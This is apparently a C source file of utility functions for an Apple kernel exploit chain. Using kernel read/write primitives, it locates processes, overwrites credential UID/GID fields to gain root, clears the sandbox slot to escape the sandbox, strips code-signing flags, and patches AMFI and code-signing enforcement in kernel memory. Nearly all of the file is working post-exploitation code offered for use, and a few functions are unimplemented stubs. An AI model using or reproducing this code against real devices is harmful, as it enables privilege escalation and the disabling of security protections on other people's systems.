/*
 * exploit_utils.c - Exploit Utility Functions Implementation
 * 
 * This file implements utility functions used by the exploit chain.
 */

#include "exploit_utils.h"
#include "kernel_rw.h"
#include "kernel_offsets.h"

/* Find process by PID */
kaddr_t find_proc_by_pid(pid_t pid) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets) return 0;
    
    kaddr_t allproc = offsets->kernel_base + offsets->allproc;
    kaddr_t proc = kernel_read64(allproc);
    
    while (proc != 0) {
        pid_t proc_pid = (pid_t)kernel_read32(proc + offsets->proc_p_pid);
        if (proc_pid == pid) {
            return proc;
        }
        proc = kernel_read64(proc + offsets->proc_p_list_le_next);
    }
    
    return 0;
}

/* Find process by name */
kaddr_t find_proc_by_name(const char *name) {
    /* Not implemented - would need to read p_comm from each proc */
    (void)name;
    return 0;
}

/* Get task from proc */
kaddr_t get_proc_task(kaddr_t proc) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return 0;
    
    return kernel_read64(proc + offsets->proc_task);
}

/* Get ucred from proc */
kaddr_t get_proc_ucred(kaddr_t proc) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return 0;
    
    return kernel_read64(proc + offsets->proc_p_ucred);
}

/* Get PID from proc */
pid_t get_proc_pid(kaddr_t proc) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return -1;
    
    return (pid_t)kernel_read32(proc + offsets->proc_p_pid);
}

/* Get IPC space from task */
kaddr_t get_task_ipc_space(kaddr_t task) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !task) return 0;
    
    return kernel_read64(task + offsets->task_itk_space);
}

/* Get VM map from task */
kaddr_t get_task_vm_map(kaddr_t task) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !task) return 0;
    
    return kernel_read64(task + offsets->task_map);
}

/* Get BSD info (proc) from task */
kaddr_t get_task_bsd_info(kaddr_t task) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !task) return 0;
    
    return kernel_read64(task + offsets->task_bsd_info);
}

/* Set UID in credential */
int set_uid(kaddr_t ucred, uid_t uid) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return -1;
    
    kernel_write32(ucred + offsets->ucred_cr_uid, uid);
    return 0;
}

/* Set GID in credential */
int set_gid(kaddr_t ucred, gid_t gid) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return -1;
    
    kernel_write32(ucred + offsets->ucred_cr_rgid, gid);
    return 0;
}

/* Set all UIDs to same value */
int set_all_uids(kaddr_t ucred, uid_t uid) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return -1;
    
    kernel_write32(ucred + offsets->ucred_cr_uid, uid);
    kernel_write32(ucred + offsets->ucred_cr_ruid, uid);
    kernel_write32(ucred + offsets->ucred_cr_svuid, uid);
    
    return 0;
}

/* Set all GIDs to same value */
int set_all_gids(kaddr_t ucred, gid_t gid) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return -1;
    
    kernel_write32(ucred + offsets->ucred_cr_rgid, gid);
    kernel_write32(ucred + offsets->ucred_cr_svgid, gid);
    
    return 0;
}

/* Get credential label */
kaddr_t get_cred_label(kaddr_t ucred) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return 0;
    
    return kernel_read64(ucred + offsets->ucred_cr_label);
}

/* Escape sandbox */
int sandbox_escape(kaddr_t ucred) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return -1;
    
    kaddr_t label = get_cred_label(ucred);
    if (!label) return -1;
    
    /* Clear sandbox slot */
    kernel_write64(label + offsets->sandbox_slot, 0);
    
    return 0;
}

/* Check if sandboxed */
bool is_sandboxed(kaddr_t ucred) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !ucred) return true;
    
    kaddr_t label = get_cred_label(ucred);
    if (!label) return true;
    
    kaddr_t sandbox = kernel_read64(label + offsets->sandbox_slot);
    return sandbox != 0;
}

/* Disable code signing enforcement for process */
int disable_cs_enforcement(kaddr_t proc) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return -1;
    
    uint32_t csflags = kernel_read32(proc + offsets->proc_p_csflags);
    
    /* Add CS_VALID, CS_PLATFORM_BINARY, CS_INSTALLER */
    csflags |= 0x04000001;  /* CS_VALID | CS_PLATFORM_BINARY */
    
    /* Remove CS_HARD, CS_KILL, CS_RESTRICT */
    csflags &= ~0x00000700;
    
    kernel_write32(proc + offsets->proc_p_csflags, csflags);
    
    return 0;
}

/* Add CS flags */
int add_cs_flags(kaddr_t proc, uint32_t flags) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return -1;
    
    uint32_t csflags = kernel_read32(proc + offsets->proc_p_csflags);
    csflags |= flags;
    kernel_write32(proc + offsets->proc_p_csflags, csflags);
    
    return 0;
}

/* Remove CS flags */
int remove_cs_flags(kaddr_t proc, uint32_t flags) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return -1;
    
    uint32_t csflags = kernel_read32(proc + offsets->proc_p_csflags);
    csflags &= ~flags;
    kernel_write32(proc + offsets->proc_p_csflags, csflags);
    
    return 0;
}

/* Get CS flags */
uint32_t get_cs_flags(kaddr_t proc) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets || !proc) return 0;
    
    return kernel_read32(proc + offsets->proc_p_csflags);
}

/* Allow any signature (AMFI bypass) */
int amfi_allow_any_signature(void) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets) return -1;
    
    kaddr_t amfi_addr = offsets->kernel_base + offsets->amfi_allow_any_signature;
    kernel_write32(amfi_addr, 1);
    
    return 0;
}

/* Disable library validation */
int amfi_disable_library_validation(void) {
    /* Similar to amfi_allow_any_signature */
    return amfi_allow_any_signature();
}

/* Patch kernel security features */
int patch_kernel_security(void) {
    const kernel_offsets_t *offsets = offsets_get();
    if (!offsets) return -1;
    
    /* Disable AMFI */
    amfi_allow_any_signature();
    
    /* Disable code signing enforcement */
    kaddr_t cs_addr = offsets->kernel_base + offsets->cs_enforcement_disable;
    kernel_write32(cs_addr, 0);
    
    return 0;
}

/* Unpatch kernel security (restore) */
int unpatch_kernel_security(void) {
    /* Not implemented - would need to save original values */
    return -1;
}

/* Open IOKit service */
io_connect_t open_iokit_service(const char *name, uint32_t type) {
    io_service_t service = IOServiceGetMatchingService(
        kIOMainPortDefault,
        IOServiceMatching(name)
    );
    
    if (!service) {
        return 0;
    }
    
    io_connect_t connection = 0;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), type, &connection);
    IOObjectRelease(service);
    
    if (kr != KERN_SUCCESS) {
        return 0;
    }
    
    return connection;
}

/* Call IOKit method */
int call_iokit_method(io_connect_t conn, uint32_t selector,
                      uint64_t *input_scalars, uint32_t input_scalar_count,
                      void *input_struct, size_t input_struct_size,
                      uint64_t *output_scalars, uint32_t *output_scalar_count,
                      void *output_struct, size_t *output_struct_size) {
    
    kern_return_t kr = IOConnectCallMethod(
        conn,
        selector,
        input_scalars, input_scalar_count,
        input_struct, input_struct_size,
        output_scalars, output_scalar_count,
        output_struct, output_struct_size
    );
    
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

/* Get current time in nanoseconds */
uint64_t get_time_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

/* Sleep for milliseconds */
void sleep_ms(uint32_t ms) {
    usleep(ms * 1000);
}

/* Hexdump memory */
void hexdump(const void *data, size_t size) {
    const uint8_t *p = (const uint8_t *)data;
    
    for (size_t i = 0; i < size; i += 16) {
        printf("%08zx: ", i);
        
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            printf("%02x ", p[i + j]);
        }
        
        printf(" ");
        
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            char c = p[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        
        printf("\n");
    }
}

/* Hexdump kernel memory */
void hexdump_kernel(kaddr_t addr, size_t size) {
    uint8_t *buf = malloc(size);
    if (!buf) return;
    
    kernel_read(addr, buf, size);
    
    printf("Kernel memory at 0x%016llx:\n", addr);
    hexdump(buf, size);
    
    free(buf);
}
